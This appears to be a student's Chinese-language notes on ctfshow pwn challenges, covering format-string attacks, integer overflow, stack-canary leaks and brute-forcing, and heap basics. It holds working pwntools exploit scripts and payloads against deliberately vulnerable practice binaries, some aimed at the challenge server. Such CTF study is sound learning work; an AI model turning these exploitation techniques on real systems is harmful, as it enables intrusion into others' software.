## 91
存在格式化字符串漏洞，也就是printf的输入我们可以自己定义
简而言之，printf还会自动解析一下给他的字符串参数
注意一下printf的定义：
 - %n：将当前已成功输出的字符数写入对应参数指向的地址（任意地址写入）
 - 通过`%k$n`（如`%7$n`）可直接指定使用第k个参数，无需按顺序遍历所有占位符。
所以说可以通过直接输入%2c%k$n来直接指定任意地址来输入一个6
通过看见反编译代码，可以通过控制daniu的值为6来让他直接执行system(/bin/sh)
然后就是动态调试一下找出来printf中我们输入的是第几个参数
![[Pasted image 20260421191549.png]]
计算一下，printf的位置也就是esp执行的位置，是0xffffd0bc
我输入的值的位置他已经帮我标注出来了，是0xffffd0dc
所以我只需要直接输入这个值来跳转到相应的位置就行了
payload = addr(daniu) + b"%2c%7$n"

注意一下是从c0开始算，因为c0是buffset，后面的才是从第一个参数开始计算的
## 92
```c
unsigned __int64 flagishere()
{
  FILE *stream; // [rsp+8h] [rbp-68h]
  char format[10]; // [rsp+16h] [rbp-5Ah] BYREF
  char s[72]; // [rsp+20h] [rbp-50h] BYREF
  unsigned __int64 v4; // [rsp+68h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  stream = fopen("/ctfshow_flag", "r");
  if ( !stream )
  {
    puts("/ctfshow_flag: No such file or directory.");
    exit(0);
  }
  fgets(s, 64, stream);
  printf("Enter your format string: ");
  __isoc99_scanf("%9s", format);
  printf("The flag is :");
  printf(format, s);
  return __readfsqword(0x28u) ^ v4;
}
```
看一下这一道题目，看出来他把flag读到了s这个字符串里面
所以可以直接把%s放进printf就能直接把flag输出出来
## 93
?
逗我玩呢？
直接输入7
再见

## 94

看一下源代码
```
void __noreturn ctfshow()
{
  char buf[100]; // [esp+8h] [ebp-70h] BYREF
  unsigned int v1; // [esp+6Ch] [ebp-Ch]

  v1 = __readgsdword(0x14u);
  while ( 1 )
  {
    memset(buf, 0, sizeof(buf));
    read(0, buf, 0x64u);
    printf(buf);
  }
}
```
可以把printf的glt表覆盖成system的plt表
但是问题是我们怎么输入怎么多字符
```python
fmtstr_payload(6, {printf_got: system_plt}, write_size="short")
```
这个就真的是纯正的一个个字符输入，逆天
直接上传这个就行了
## 95
格式化字符串里的 `%s` 会把某个参数当作地址，然后从这个地址开始读字符串。

我们构造：

```python
payload = p32(printf_got) + b"%6$s"
```

含义是：

```text
payload 开头先放 0x0804a010
%6$s 把第 6 个参数当作地址
第 6 个参数正好是我们放进去的 0x0804a010
于是 printf 会从 0x0804a010 开始读内容
```
自己做不出来，没有libc
找也找不到
再见
## 96

steam将flag的值保存在了本地
所以我们可以直接再栈上面爆破值来找
```
from pwn import *

import re

import string

  

context(os="linux", arch="i386", log_level="error")

  

def printable(bs):

    return ''.join(chr(b) if chr(b) in string.printable and b != 0 else '.' for b in bs)

  

for start in range(1, 100, 8):

    io = process("./pwn")

  

    payload = ".".join(f"%{i}$p" for i in range(start, start + 8)).encode()

    io.sendline(payload)

  

    data = io.recvall(timeout=0.5)

    io.close()

  

    vals = re.findall(rb"0x[0-9a-fA-F]+", data)

  

    raw = b""

    for v in vals:

        raw += p32(int(v, 16))

  

    text = printable(raw)

    print(f"[{start}-{start+7}] {text}")
```
## 97
看一下源代码，只需要把全局变量check的值覆盖掉就行了
找一下类似
`01:0004│-078 0xffffd090 —▸ 0xffffd0ac ◂— 'aaaa\n'`
直接算就行了
## 98
他有后门
```c
int _stack_check()
{
  puts("you_find_me_but_I_have_canary_protect_me!");
  return system("/bin/sh");
}
```
找到get的got地址，覆盖成这个函数的plt地址，然后就行了

# 整数安全

## 101
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned int v4; // [rsp+0h] [rbp-10h] BYREF
  int v5; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v6; // [rsp+8h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  init(argc, argv, envp);
  logo();
  puts("Maybe these help you:");
  useful();
  v4 = 0x80000000;
  v5 = 0x7FFFFFFF;
  printf("Enter two integers: ");
  if ( (unsigned int)__isoc99_scanf("%d %d", &v4, &v5) == 2 )
  {
    if ( v4 == 0x80000000 && v5 == 0x7FFFFFFF )
      gift();
    else
      printf("upover = %d, downover = %d\n", v4, v5);
    return 0;
  }
  else
  {
    puts("Error: Invalid input. Please enter two integers.");
    return 1;
  }
}
```
直接查看原地阿玛
这里直接告诉你了，输入v4，v5
然后判断一下，如果v4和v5是你输入的值，那么就判断通过
所以应该是直接输出就行了
```
io.sendlineafter(b":", b"-2147483648 2147483647")
```
但是注意一下，因为我们用的语言是python，而众所周知python的int是没有精度的
所以你直接输出int(0x80000000)会输出出来一个正的
但是我们实际需要的是负的
所以需要手搓一个仿c的int
```
def c_int(x):
    x &= 0xffffffff          # 截断成 32 位
    if x >= 0x80000000:      # 最高位是 1，说明是负数
        x -= 0x100000000
    return x

```

## 102
```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v5; // [rsp+8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  init(argc, argv, envp);
  logo();
  puts("Maybe these help you:");
  useful();
  v4 = 0;
  printf("Enter an unsigned integer: ");
  __isoc99_scanf("%u", &v4);
  if ( v4 == -1 )
    gift();
  else
    printf("Number = %u\n", v4);
  return 0;
}
```
这个%u是无符号int
所以其实用c语言的话，你直接unsigned_int一下-1就能知道结果是0xffffffff
所以这个就是直接输出0xffffffff
io.sendlineafter(b":", b"4294967295")
或者是
io.sendlineafter(b":", b"-1")

## 103

```c
unsigned __int64 ctfshow()
{
  int v1; // [rsp+4h] [rbp-6Ch] BYREF
  void *src; // [rsp+8h] [rbp-68h]
  _BYTE dest[88]; // [rsp+10h] [rbp-60h] BYREF
  unsigned __int64 v4; // [rsp+68h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  v1 = 0;
  src = 0;
  printf("Enter the length of data (up to 80): ");
  __isoc99_scanf("%d", &v1);
  if ( v1 <= 80 )
  {
    printf("Enter the data: ");
    __isoc99_scanf(" %[^\n]", dest);
    memcpy(dest, src, v1);
    if ( (unsigned __int64)dest > 0x1BF52 )
      gift();
  }
  else
  {
    puts("Invalid input! No cookie for you!");
  }
  return __readfsqword(0x28u) ^ v4;
}
```
`__isoc99_scanf(" %[^\n]", dest);`是一直接受字符直到换行符
这题是长度检验
```
void *memcpy(void *dest, const void *src, size_t n);
dest  // 目标地址，复制到哪里
src   // 源地址，从哪里复制
n     // 复制多少字节
```
dest是一个数组，并不是一个目标地址
所以程序会崩溃
但是可以把n设定为0来跳过这个执行，防止崩溃
## 104
```c
ssize_t ctfshow()
{
  _BYTE buf[10]; // [rsp+2h] [rbp-Eh] BYREF
  size_t nbytes; // [rsp+Ch] [rbp-4h] BYREF

  LODWORD(nbytes) = 0;
  puts("How long are you?");
  __isoc99_scanf("%d", &nbytes);
  puts("Who are you?");
  return read(0, buf, (unsigned int)nbytes);
}
```
可以自定义输入的长度
这个好像是栈溢出就能做
注意一下如果你前面的长度写小了，可能后面的溢出长度不对，cyclic不出来

## 105
```
EAX = 32 位
AX  = EAX 的低 16 位
AL  = EAX 的低 8 位
AH  = EAX 的第 8~15 位
```
然后你反编译一下看代码
mov     [ebp+var_9], al
这个的意思是把eax的最后两位16进制放到ebp+9的位置
所以这里是截断了字符串，但是反编译看不出来
阴间啊
所以只需要构造一个长度为104的就可以，他截断以后就剩下了最后两位04
然后因为`strcpy` 是复制完整长串，不管长度
所以直接
```
payload = b"A" * 0x15 + p32(success)
payload = payload.ljust(0x104, b"A")
```
注意一下反编译可能发生各种反编译忽略或者不存在的问题

## 106
一路追到check_passwd函数，发现这个函数也存在低地址截断的问题
```
.text:080488A2                 add     esp, 10h
.text:080488A5                 mov     [ebp+var_9], al
.text:080488A8                 cmp     [ebp+var_9], 3
.text:080488AC                 jbe     short loc_80488B4
.text:080488AE                 cmp     [ebp+var_9], 8
.text:080488B2                 jbe     short loc_80488DC
```
和上一道题目一样，直接截断了最后两位
然后这里面其实的长度限制是512
所以直接溢出就行了

## 107
```c
int show()
{
  char nptr[32]; // [esp+1Ch] [ebp-2Ch] BYREF
  int v2; // [esp+3Ch] [ebp-Ch]

  printf("How many bytes do you want me to read? ");
  getch(nptr, 4);
  v2 = atoi(nptr);
  if ( v2 > 32 )
    return printf("No! That size (%d) is too large!\n", v2);
  printf("Ok, sounds good. Give me %u bytes of data!\n", v2);
  getch(nptr, v2);
  return printf("You said: %s\n", nptr);
}
int __cdecl getch(int a1, unsigned int a2)
{
  unsigned int v2; // eax
  char v4; // [esp+Bh] [ebp-Dh]
  unsigned int i; // [esp+Ch] [ebp-Ch]

  for ( i = 0; ; ++i )
  {
    v4 = getchar();
    if ( !v4 || v4 == 10 || i >= a2 )
      break;
    v2 = i;
    *(v2 + a1) = v4;
  }
  *(a1 + i) = 0;
  return a1 + i;
}
```
能够发现这两个传入的数据的长度其实是两个数据类型
第一个是int型，而且没有负数检测
第二个是unsigned int型，而且没有负数检测
他的检测只有是不是小于32
而且这个是在int时检测的，所以只需要直接输入-1就能无限制输入
但是这个好像也没有nx啊，不能直接执行shellcode好像
那就libc偏移
## 108
# Bypass安全机制
## 111
直接libc偏移出结果
## 112
全局变量没有金丝雀，所以直接覆盖就可以了
## 113
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rax
  _BYTE v5[1032]; // [rsp+0h] [rbp-420h] BYREF
  __int64 v6; // [rsp+408h] [rbp-18h]
  char v7; // [rsp+417h] [rbp-9h]
  __int64 v8; // [rsp+418h] [rbp-8h]

  is_detail = 0;
  go();
  logo(argc, argv);
  fwrite(">> ", 1u, 3u, stdout);
  fflush(stdout);
  v8 = 0;
  while ( !feof(stdin) )
  {
    v7 = fgetc(stdin);
    if ( v7 == 10 )
      break;
    v3 = v8++;
    v6 = v3;
    v5[v3] = v7;
  }
  v5[v8] = 0;
  if ( (unsigned int)init(v5) )
  {
    qsort(files, size_of_path, 0x200u, cmp);
    search_file_info();
  }
  else
  {
    fflush(stdout);
    set_secommp();
  }
  return 0;
}
```
先看一下，感觉是不能让init进入到else的判断中，这里的seccommp是沙箱，沙箱做法看69题，先想方设法的不进沙箱
这里的初始化是自定义的
先进去看看
```c
__int64 __fastcall init(char *a1)
{
  __int64 result; // rax
  char *v2; // rax
  struct stat stat_buf; // [rsp+10h] [rbp-1A0h] BYREF
  char ptr[256]; // [rsp+A0h] [rbp-110h] BYREF
  char *src; // [rsp+1A0h] [rbp-10h]
  _BYTE *v6; // [rsp+1A8h] [rbp-8h]

  size_of_path = 0;
  if ( (unsigned int)_stat(a1, &stat_buf) == -1 )
  {
    strcpy(ptr, "Can't get the information of the given path.\n");
    fwrite(ptr, 1u, 0x2Eu, stdout);
    return 0;
  }
  else if ( (stat_buf.st_mode & 0xF000) == 0x8000 )
  {
    size_of_path = 1;
    src = __xpg_basename(a1);
    strcpy(files, src);
    strcpy(dest, a1);
    return 1;
  }
  else
  {
    result = stat_buf.st_mode & 0xF000;
    if ( (_DWORD)result == 0x4000 )
    {
      if ( a1[strlen(a1) - 1] != 47 )
      {
        v2 = &a1[strlen(a1)];
        v6 = v2 + 1;
        *v2 = 47;
        *v6 = 0;
      }
      get_dir_detail(a1);
      return 1;
    }
  }
  return result;
}
```
逻辑简单，就是输入一个文件地址，我们可以通过\x00截断
然后就可以直接算出来偏移值了
## 115
```
File:     /mnt/hgfs/share/pwn/Bypass安全机制/115/pwn
Arch:     i386
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
Stripped:   No
```
开了canary，所以需要记录一下金丝雀的数值
至于怎么记录，直接爆破就行，当然你也可以看一下栈里面他在哪里自己算
但是我的评价是不如爆破
```python
from pwn import *

import re

  

context(os="linux", arch="i386", log_level="error")

  

prompt = b"Try Bypass Me!"

start = 1

end = 80

  
  

def send_first(io, payload):

    io.sendafter(prompt, payload)

  
  

# 格式化字符串爆破模板：每个偏移跑两次，先找会变的值，再重点看末尾是 00 的项

for i in range(start, end + 1):

    values = []

  

    for _ in range(2):

        io = process("./pwn")

        send_first(io, f"%{i}$p\n".encode())

        data = io.recvrepeat(0.3).decode(errors="ignore")

        io.close()

  

        m = re.search(r"0x[0-9a-fA-F]+|\(nil\)", data)

        values.append(m.group(0) if m else "(empty)")

  

    text1 = values[0]

    text2 = values[1]

  

    v1 = int(text1, 16) if text1.startswith("0x") else None

    v2 = int(text2, 16) if text2.startswith("0x") else None

  

    flag = ""

    if text1 != text2 and v1 is not None and v2 is not None:

        flag += "  <== changed"

    if text1 == text2 and v1 is not None and 0x08040000 <= v1 <= 0x09000000:

        flag += "  <== possible binary addr"

    if text1 != text2 and v1 is not None and v2 is not None and (v1 & 0xff) == 0 and (v2 & 0xff) == 0:

        flag += "  <== possible canary"

  

    print(f"{i:02d}: {text1} | {text2}{flag}")
```
通过这个能爆破出来金丝雀的地址
然后因为金丝雀一般放在上一个栈的栈帧和返回地址之间，一般在0x0c的位置，所以buf放在0xd4
那么第一段的offset就应该是0xc8
然后会有一段0x8的保护区，什么也不写，写什么无所谓
最后是上一个栈的栈帧和esp，所以直接用这个就行了
给出payload
```python
backdoor = 0x080485a6

offset = 0xc8

  

io.sendafter(b"Try Bypass Me!", b"%55$p")

io.recvuntil(b"0x")

canary = int(b"0x" + io.recvn(8), 16)

log.success(f"canary = {hex(canary)}")

  

payload = b"A" * offset

payload += p32(canary)

payload += b"B" * 12

payload += p32(backdoor)

io.send(payload)

io.interactive()
```

## 116
Arch:     i386
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
Stripped:   No
直接查看源代码
```c
unsigned int ctfshow()
{
  char buf[32]; // [esp+Ch] [ebp-2Ch] BYREF
  unsigned int v2; // [esp+2Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  puts("Look me & use me!");
  read(0, buf, 0x50u);
  printf(buf);
  read(0, buf, 0x50u);
  return __readgsdword(0x14u) ^ v2;
}
```
好像和上一道题目差不多
都是先泄露cancry，然后直接python溢出
发现后门函数qwerasd
直接调用就行
这道题目的canary是15

## 117
Arch:     amd64
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int fd; // [rsp+2Ch] [rbp-114h]
  _BYTE v5[264]; // [rsp+30h] [rbp-110h] BYREF
  unsigned __int64 v6; // [rsp+138h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  logo();
  init();
  fd = open("/flag", 0);
  if ( !fd )
  {
    puts("No such file or directory.");
    exit(-1);
  }
  read(fd, &buf, 0x100u);
  puts("Haha,It has reduced you a lot of difficulty!");
  gets(v5);
  return 0;
}
```
很明显的能发现在这个好像栈溢出能直接执行，但是有canary
不太对的样子
```python
from pwn import *

context(arch='amd64',os='linux',log_level='debug')

io = remote('pwn.challenge.ctf.show',28242)

e=ELF("./pwn")

payload=b"a"*504+p64(e.sym["main"])

io.sendline(payload)

io.interactive()
```
直接输入进去
```
*** stack smashing detected ***: UH\x89\xe5H\x81\xec@\x01 terminated
```
他打印出来个这么个东西
打印出来的是机器字节码，我传入的地址被当成报错来写出来了
那么他就是给了我一个任意读的东西
加上buf的全局地址我们已经知道了
那么就直接读取就行了
这个是老版本的___stack_chk_fail的函数的问题
在汇编视图中，能看到最后是call了这个函数来进行对于canary的校验
因为这个校验会报错，所以能通过这个报错得到结果

## 118
Arch:     i386
RELRO:      No RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
Stripped:   No
```c
unsigned int ctfshow()
{
  char buf[80]; // [esp+Ch] [ebp-5Ch] BYREF
  unsigned int v2; // [esp+5Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  read(0, buf, 0xA0u);
  printf(buf);
  return __readgsdword(0x14u) ^ v2;
}
```
这道题有printf，可以直接篡改函数，但是因为之前我们都是可以执行好几次的，但是这里我们只能执行一次，就有点问题了
但是发现有后门函数，所以其实只要修改pringtf后面的一个函数的got表为后门函数就行了
```
.text:08048747                 call    _printf
.text:0804874C                 add     esp, 10h
.text:0804874F                 nop
.text:08048750                 mov     eax, [ebp+var_C]
.text:08048753                 xor     eax, large gs:14h
.text:0804875A                 jz      short loc_8048761
.text:0804875C                 call    __stack_chk_fail_local
```
发现后面只有__stack_chk_fail_local这个函数了，那么就把这个函数改成后门函数就行了
![[Pasted image 20260512203517.png]]
算一下这个的参数值应该是7
算法就是cc-b0，然后除以4得到7
算是可以算出来的，但是还有其他的方法
`AAAA.%1$p.%2$p.%3$p.%4$p.%5$p.%6$p.%7$p.%8$p.%9$p.%10$p`
通过这个能直接找出来

## 119
Arch:     i386
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
Stripped:   No
```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  init(&argc);
  puts(asc_8048918);
  puts(asc_804898C);
  puts(asc_8048A08);
  puts(asc_8048A94);
  puts(asc_8048B24);
  puts(asc_8048BA8);
  puts(asc_8048C3C);
  puts("    * *************************************                           ");
  puts(aClassifyCtfsho);
  puts("    * Type  : Linux_Security_Mechanism_Bypass                         ");
  puts("    * Site  : https://ctf.show/                                       ");
  puts("    * Hint  : Turned on Canary, simply bypass it!                     ");
  puts("    * *************************************                           ");
  while ( 1 )
  {
    puts("Try PWN Me!");
    if ( !fork() )
      break;
    wait(0);
  }
  ctfshow();
  exit(0);
}
```
注意这个里面的fork函数，这个是创建子进程
如果不是子进程，就创建子进程，返回子进程pid
如果是子进程，就直接退出，返回0
因为子进程的进程PID是继承父进程的
而又因为我们连接的所有进程都是进入了子进程
所以所有的子进程的canary都是相等的
所以只需要爆破子进程的值就可以了
```python
from pwn import *

context(os="linux", arch="i386", log_level="debug")

HOST, PORT = "pwn.challenge.ctf.show", 0

  

offset = 0x64

backdoor = 0x08048636

  

def try_payload(payload: bytes) -> bool:

    io = remote(HOST, PORT)

    io.send(payload)

    data = io.recv(timeout=0.4)

    io.close()

    return b"stack smashing" not in data and b"terminated" not in data

  

canary = b"\x00"

for idx in range(1, 4):

    for b in range(256):

        guess = canary + bytes([b])

        if try_payload(b"A" * offset + guess):

            canary = guess

            log.success(f"canary[{idx}] = {b:#x}, canary = {canary.hex()}")

            break

    else:

        raise RuntimeError("canary brute force failed")

  

io = remote(HOST, PORT)

payload = b"A" * offset + canary + b"B" * 12 + p32(backdoor)

io.send(payload)

io.interactive()
```
## 120（skip）
先了解线程这个概念
一个程序可以有多个线程，他们共享除了栈空间以外的所有东西
这个线程局部存储的区域称为tls
## 121(skip)
太复杂了，跳过
# 堆溢出 \_前置基础
## 135
这道题目纯属是让你学习堆的基本使用方法的
首先有三个函数，malloc，calloc，realloc
### malloc
malloc的作用是生成一个对空间，可以通过heap来看出来
这个堆空间一般是比你要求的空间要大的
比如你申请100的空间
```
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555603000
Size: 0x300 (with flag bits: 0x301)

Allocated chunk | PREV_INUSE
Addr: 0x555555603300
Size: 0x70 (with flag bits: 0x71)

Top chunk | PREV_INUSE
Addr: 0x555555603370
Size: 0x20c90 (with flag bits: 0x20c91)
```
这里申请的是第一个，可以看见分配的空间是0x301
### calloc
作用和malloc的作用一样，但是区别是他会在申请完成以后清空在
```
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555603000
Size: 0x300 (with flag bits: 0x301)

Allocated chunk | PREV_INUSE
Addr: 0x555555603300
Size: 0x70 (with flag bits: 0x71)

Top chunk | PREV_INUSE
Addr: 0x555555603370
Size: 0x20c90 (with flag bits: 0x20c91)
```
所以这就可能导致一个漏洞，malloc申请之后它里面本来就有值，可以直接执行。
### realloc
realloc 是“调整已有堆块大小”的函数，本质上是对老指针对应的 chunk 做扩容或缩容。

基本形式：

`ptr = realloc(ptr, new_size);`

它有 3 种常见情况：

- 原地调整：后面空间够，直接在原地址扩/缩，返回值和原来一样。
- 搬家复制：原地不够，就新申请一块，把旧内容拷过去，再释放旧块，返回新地址。
- 特殊情况：
    - realloc(NULL, size) 等价于 malloc(size)
    - realloc(ptr, 0) 在很多实现里等价于 free(ptr)，但返回值细节要小心

```
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555603000
Size: 0x300 (with flag bits: 0x301)

Allocated chunk | PREV_INUSE
Addr: 0x555555603300
Size: 0x70 (with flag bits: 0x71)

Top chunk | PREV_INUSE
Addr: 0x555555603370
Size: 0x20c90 (with flag bits: 0x20c91)
```
## 136
和135差不多，三个函数
ptr_calloc
ptr_realloc
ptr_malloc
这个是用来看释放后的操作的
### ptr_malloc
```
pwndbg> heap
Support for tcache large bins (a GLIBC 2.42 addition) has not been fully implemented. PR contributions are highly appreciated!
Allocated chunk | PREV_INUSE
Addr: 0x555555603000
Size: 0x300 (with flag bits: 0x301)

Allocated chunk | PREV_INUSE
Addr: 0x555555603300
Size: 0x20 (with flag bits: 0x21)

Allocated chunk | PREV_INUSE
Addr: 0x555555603320
Size: 0x20 (with flag bits: 0x21)

Allocated chunk | PREV_INUSE
Addr: 0x555555603340
Size: 0x20 (with flag bits: 0x21)

Top chunk | PREV_INUSE
Addr: 0x555555603360
Size: 0x20ca0 (with flag bits: 0x20ca1)
```
这个是free之前的堆空间，堆的空间是0x20
```
0x555555603300: 0x0000000000000000      0x0000000000000021
0x555555603310: 0x0000000000000000      0x0000000000000000
```
然后free之后的空间
```
0x555555603300: 0x0000000000000000      0x0000000000000021
0x555555603310: 0x0000000555555603      0xa59241db6ca15a08
```
发现空间出现了变动，有了两个值
0x0000000555555603是fd
fd = NULL ^ (addr >> 12)
fd是堆空间被挂进空表以后，指向的下一个空闲chunk的值
这里的fd指向的是原来的头
### ptr_calloc
这个释放后也没有什么明显的区别，但是其实是把数据清零了
但是我并不理解为什么没有把size也清零
## 137
```c
int sbrk_brk()
{
  __pid_t v0; // eax
  void *v1; // rax
  char *addr; // [rsp+0h] [rbp-10h]
  void *v4; // [rsp+8h] [rbp-8h]

  v0 = getpid();
  printf("sbrk example:%d\n", v0);
  addr = (char *)sbrk(0);
  printf("Program Break Location1:%p\n", addr);
  getchar();
  brk(addr + 4096);
  v1 = sbrk(0);
  printf("Program Break Location2:%p\n", v1);
  getchar();
  brk(addr);
  v4 = sbrk(0);
  printf("Program Break Location3:%p\n", v4);
  getchar();
  return system("cat /ctfshow_flag");
}
```
这个v0保存的是进程的pid，因为他不是一个正常的数值类型，有一个专门的类型pid
sbrk:不移动堆顶，只返回当前program break的位置
program break的意思是堆区的当前结束位置
也可以理解为heap的顶部边界
然后把这个值强制转换成地址类型，保存到addr
最后直接打印对应的地址
这里可以同通过打印对应的pid的地址来显示地址的位置
```
└─$ cat /proc/63608/maps       
555555400000-555555402000 r-xp 00000000 00:33 22                         /mnt/hgfs/share/pwn/堆利用-前置基础/137/pwn
555555601000-555555602000 r--p 00001000 00:33 22                         /mnt/hgfs/share/pwn/堆利用-前置基础/137/pwn
555555602000-555555603000 rw-p 00002000 00:33 22                         /mnt/hgfs/share/pwn/堆利用-前置基础/137/pwn
7ffff7da7000-7ffff7daa000 rw-p 00000000 00:00 0 
7ffff7daa000-7ffff7dd2000 r--p 00000000 08:01 2670018                    /usr/lib/x86_64-linux-gnu/libc.so.6
7ffff7dd2000-7ffff7f3a000 r-xp 00028000 08:01 2670018                    /usr/lib/x86_64-linux-gnu/libc.so.6
7ffff7f3a000-7ffff7f8d000 r--p 00190000 08:01 2670018                    /usr/lib/x86_64-linux-gnu/libc.so.6
7ffff7f8d000-7ffff7f91000 r--p 001e3000 08:01 2670018                    /usr/lib/x86_64-linux-gnu/libc.so.6
7ffff7f91000-7ffff7f93000 rw-p 001e7000 08:01 2670018                    /usr/lib/x86_64-linux-gnu/libc.so.6
7ffff7f93000-7ffff7fa0000 rw-p 00000000 00:00 0 
7ffff7fbd000-7ffff7fbf000 rw-p 00000000 00:00 0 
7ffff7fbf000-7ffff7fc3000 r--p 00000000 00:00 0                          [vvar]
7ffff7fc3000-7ffff7fc5000 r--p 00000000 00:00 0                          [vvar_vclock]
7ffff7fc5000-7ffff7fc7000 r-xp 00000000 00:00 0                          [vdso]
7ffff7fc7000-7ffff7fc8000 r--p 00000000 08:01 2666642                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7ffff7fc8000-7ffff7ff0000 r-xp 00001000 08:01 2666642                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7ffff7ff0000-7ffff7ffb000 r--p 00029000 08:01 2666642                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7ffff7ffb000-7ffff7ffd000 r--p 00034000 08:01 2666642                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7ffff7ffd000-7ffff7ffe000 rw-p 00036000 08:01 2666642                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7ffff7ffe000-7ffff7fff000 rw-p 00000000 00:00 0 
7ffffffde000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]
```
brk是设置程序的program break的位置
通过扩展，然后又缩回，能看到堆的边界的扩展
## 138
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __pid_t v3; // eax
  void *addr; // [rsp+8h] [rbp-8h]

  init(argc, argv, envp);
  logo();
  v3 = getpid();
  printf("Welcome to private anonymous mapping example::PID:%d\n", v3);
  puts("Before mmap");
  getchar();
  addr = mmap(0, 0x21000u, 3, 34, -1, 0);
  if ( addr == (void *)-1LL )
    errExit("mmap");
  puts("After mmap");
  getchar();
  if ( munmap(addr, 0x21000u) == -1 )
    errExit("munmap");
  puts("After munmap");
  getchar();
  system("cat /ctfshow_flag");
  return 0;
}
```
### mmap(addr, length, prot, flags, fd, offset)
- addr = 0
    - 让内核自己选映射地址
- length = 0x21000
    - 映射 0x21000 字节
- prot = 3
    - PROT_READ | PROT_WRITE
- flags = 34
    - 0x22 = MAP_PRIVATE | MAP_ANONYMOUS
- fd = -1
    - 匿名映射时固定这样传
- offset = 0
    - 偏移 0
这句的效果就是：

1. 向内核申请一块大小 0x21000 的匿名内存
2. 这块内存可读可写
3. 不对应任何文件
4. 返回映射起始地址给 addr
通过断点能看到这个堆的空间在0x7ffff7d86000
但是因为他的上面就是边界，所以上面是不可读的
```
pwndbg> x/32gx 0x7ffff7d86000
0x7ffff7d86000: 0x0000000000000000      0x0000000000000000
0x7ffff7d86010: 0x0000000000000000      0x0000000000000000
0x7ffff7d86020: 0x0000000000000000      0x0000000000000000
0x7ffff7d86030: 0x0000000000000000      0x0000000000000000
0x7ffff7d86040: 0x0000000000000000      0x0000000000000000
0x7ffff7d86050: 0x0000000000000000      0x0000000000000000
0x7ffff7d86060: 0x0000000000000000      0x0000000000000000
0x7ffff7d86070: 0x0000000000000000      0x0000000000000000
0x7ffff7d86080: 0x0000000000000000      0x0000000000000000
0x7ffff7d86090: 0x0000000000000000      0x0000000000000000
0x7ffff7d860a0: 0x0000000000000000      0x0000000000000000
0x7ffff7d860b0: 0x0000000000000000      0x0000000000000000
0x7ffff7d860c0: 0x0000000000000000      0x0000000000000000
0x7ffff7d860d0: 0x0000000000000000      0x0000000000000000
0x7ffff7d860e0: 0x0000000000000000      0x0000000000000000
0x7ffff7d860f0: 0x0000000000000000      0x0000000000000000
```
注意这个里面没有写size，因为这个不是malloc申请的
- malloc 类小块：size 往往在 **chunk header**
- mmap 类大块/独立映射：size 往往在 **内核映射信息**
-  不是所有内存块都会把 size 明文放在“用户指针前 8 字节”
## 139
```c
void flag_demo()
{
  __int64 i; // [rsp+0h] [rbp-20h]
  FILE *stream; // [rsp+8h] [rbp-18h]
  __int64 size; // [rsp+10h] [rbp-10h]
  char *ptr; // [rsp+18h] [rbp-8h]

  stream = fopen("/ctfshow_flag", "rb");
  if ( stream )
  {
    fseek(stream, 0, 2);
    size = ftell(stream);
    fseek(stream, 0, 0);
    puts("Allocate heap memory:");
    sleep(3u);
    ptr = (char *)malloc(size);
    if ( ptr )
    {
      sleep(1u);
      puts("Read ctfshow_flag");
      sleep(3u);
      if ( fread(ptr, 1u, size, stream) == size )
      {
        fclose(stream);
        puts("Here is your flag:");
        for ( i = 0; i < size; ++i )
          putchar(ptr[i]);
        sleep(1u);
        puts("free");
        free(ptr);
      }
      else
      {
        perror("Failed to read file");
        fclose(stream);
        free(ptr);
      }
    }
    else
    {
      perror("Memory allocation failed");
      fclose(stream);
    }
  }
  else
  {
    perror("Failed to open file");
  }
}
```
第一个malloc，将堆存储为0x555555604500的地方
```
pwndbg> x/10gx 0x555555604500
0x555555604500: 0x0000000000000000      0x0000000000000000
0x555555604510: 0x0000000000000000      0x000000000001faf1
0x555555604520: 0x0000000000000000      0x0000000000000000
0x555555604530: 0x0000000000000000      0x0000000000000000
0x555555604540: 0x0000000000000000      0x0000000000000000
```
这个里面最开头是用户区，之后是区域的size
1faf1是下一个chunk的size，这个又被称为top chunk（未分配的大空间）
```
pwndbg> x/10gx 0x555555604500-0x10
0x5555556044f0: 0x0000000000000000      0x0000000000000021
0x555555604500: 0x756b697b67616c66      0x00000000000a7d6e
0x555555604510: 0x0000000000000000      0x000000000001faf
```
之后读取到了flag，然后往下写，就是正常的flag
字符串01234567
x/bx 里会长这样（按字节看）
```
0x30 0x31 0x32 0x33 0x34 0x35 0x36 0x37
```
会在 x/gx 里显示成：（按 8 字节整数看）
```
0x3736353433323130
```
## 140
### `pthread_create(&newthread, 0, threadFunc, 0)` ：

- 创建一个新线程
- 线程创建成功后，这个新线程会从 threadFunc(0) 开始执行
- 新线程的线程 ID 会写到 newthread 这个变量里
参数分别是：
- &newthread
    - 输出参数
    - 用来接收新线程的标识符 pthread_t
